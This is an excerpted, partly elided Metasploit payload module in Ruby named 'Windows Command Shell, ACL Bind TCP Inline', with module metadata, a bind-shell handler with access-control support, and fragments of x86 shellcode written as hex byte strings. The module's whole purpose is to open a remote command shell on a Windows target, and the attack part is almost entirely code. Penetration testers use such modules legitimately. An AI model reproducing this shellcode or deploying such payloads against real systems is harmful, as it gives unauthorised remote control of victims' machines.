...
require 'msf/core'
require 'msf/core/handler/bind_acl_tcp'
...
module Metasploit3
  ...
  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Windows Command Shell, ACL Bind TCP Inline',
      ...
      'Author'        =>
        [
          ...
          'Borja Merino <bmerinofe[at]gmail.com>'	# Add ACL support
        ],
      'License'       => MSF_LICENSE,
      'Platform'      => 'win',
      'Arch'          => ARCH_X86,
      'Handler'       => Msf::Handler::BindAclTcp,
      ...
      "\x6a\x10\x54\x54\x57\x68\x74\xec\x3b\xe1\xff\xd5\xbe\xc0\xa8\x01" +
      "\x21\x5b\x39\xde\x74\x0a\x50\x68\x75\x6e\x4d\x61\xff\xd5\xeb\xe0" +
      ...
      "\x47\x13\x72\x6f\x6a\x00\x53\xff"
